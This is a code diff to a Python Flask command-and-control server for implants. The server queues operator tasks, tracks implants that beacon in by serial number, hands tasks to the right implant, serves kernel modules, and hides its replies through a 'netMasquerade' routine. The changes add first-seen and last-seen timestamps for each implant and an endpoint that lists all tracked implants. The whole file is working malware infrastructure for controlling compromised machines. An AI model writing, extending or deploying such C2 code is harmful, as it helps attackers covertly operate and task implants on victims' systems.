@@ -1,9 +1,11 @@
 from flask import Flask
 from flask import request
 from flask import send_from_directory
+from flask import jsonify
 import base64
 import json
 import binascii
+import datetime
 from struct import pack, calcsize
 from collections import deque
 import secrets
@@ -68,10 +70,20 @@ kmodsRootDir = "/kmods/"
 # Fifo queue of tasks to execute by implant
 # POST request to /tasking endpoint adds (appendLeft) a new task to it
 # GET request to /endpoint endpoint pops a task (if available) from it and starts processing it
+# dictionary stores JSON objects serialized to strings (json.dumps()) to deserialize it to the dict use: json.loads()
 TaskFifo = deque()
 
-# repository of implants that beaconed to C2 server at least once
-# dictionary stores lists[] of implants' essential info. Dictionary uses 'SN' (implant's serial number) as its key.
+# repository of implants that beaconed to us at least once
+# dictionary stores dict() of implants' essential info. Dictionary uses 'SN' (implant's serial number) as its key.
+#
+# { "SN 1" : { "firstSeenAt": "",
+#  "lastSeenAt": "",
+#  "implantIdentity": "" },
+# ...
+# "SN N" : { "firstSeenAt": "",
+#  "lastSeenAt": "",
+#  "implantIdentity": "" }
+# }
 ImplantDict = dict()
 
 # dictionary stores lists[] of taskIDs assigned to given implant's 'SN'. Dictionary uses 'SN' (implant's serial number) as its key.
@@ -216,6 +228,15 @@ def addTask():
     
     str_out = ''.join(resp)
     return str_out
+
+
+@app.route("/tasking/implants", methods=['GET'])
+def implants():
+    if request.method == 'GET':
+        return jsonify(ImplantDict)
+    else:
+        return "<p>Not recognized request</p>"
+
 ### end of Handling operator's requests from console (adding new tasks and status display)
 
 ### Handling implant's beaconing
@@ -257,6 +278,7 @@ def heartbeat():
             print(e)
             return netMasquerade("", ImplantMessageType.UNKNOWN)
 
+        # TODO: validate also serial_number's exact format
         if not implant_identity:
             return netMasquerade("", ImplantMessageType.UNKNOWN)
 
@@ -264,9 +286,19 @@ def heartbeat():
         # request looks legit, process it
         #
 
-        # add/update implant's essential info list 
-        implant_record = [implant_identity]
-        ImplantDict[serial_number] = implant_record
+        # get current time
+        t = datetime.datetime.now().strftime('%Y-%m-%d %T')
+
+        # beaconing for the first time?
+        if ImplantDict.get(serial_number) is None:
+            implant_record = dict()
+            implant_record['firstSeenAt'] = t # set firstSeenAt field
+            implant_record['lastSeenAt'] = t # update lastSeenAt field
+            implant_record['implantIdentity'] = implant_identity
+            ImplantDict[serial_number] = implant_record
+        else:
+            ImplantDict[serial_number]['lastSeenAt'] = t # update lastSeenAt field
+            ImplantDict[serial_number]['implantIdentity'] = implant_identity
 
         # stay idle, if there are no tasks to process at this time
         if len(TaskFifo) == 0:
@@ -276,7 +308,7 @@ def heartbeat():
         task = TaskFifo.pop()
         cmdData = json.loads(task) # deserialize to JSON
 
-        # if popped task is meant for currently beaconing implant append it ImplantTasksDict
+        # if popped task is meant for currently beaconing implant append it to ImplantTasksDict
         # and return it in the response
         if serial_number == cmdData['SN']:
             # postprocess task based on operator's input and calling implant's identity
